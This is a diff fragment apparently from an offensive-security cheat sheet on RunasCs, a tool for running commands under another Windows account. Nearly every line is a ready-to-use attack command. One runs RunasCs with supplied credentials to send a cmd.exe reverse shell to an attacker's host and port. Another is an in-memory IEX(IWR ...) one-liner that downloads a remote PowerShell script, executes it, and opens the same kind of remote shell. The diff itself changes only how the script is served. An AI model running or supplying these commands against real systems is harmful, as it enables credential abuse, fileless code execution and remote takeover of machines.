@@ -39,7 +39,7 @@ Logon type 9 keeps me locally and uses the account over the network, for shares 
 .\RunasCs.exe "<Username>" "<Password>" cmd.exe -r <LHOST>:<LPORT> -d <Domain> -l 9
 
 ## Invoke-RunasCs, in memory
-Invoke-RunasCs.ps1 goes in the target's upload/ folder; THE-SERVE-URL is the address serve files prints for it.
+It comes with tool install runascs; THE-SERVE-URL is the address serve files Invoke-RunasCs prints for it.
 IEX(IWR -UseBasicParsing THE-SERVE-URL); Invoke-RunasCs -Username "<Username>" -Password "<Password>" -Command "cmd.exe" -Remote <LHOST>:<LPORT>
 
 ## From PowerShell, with no tool
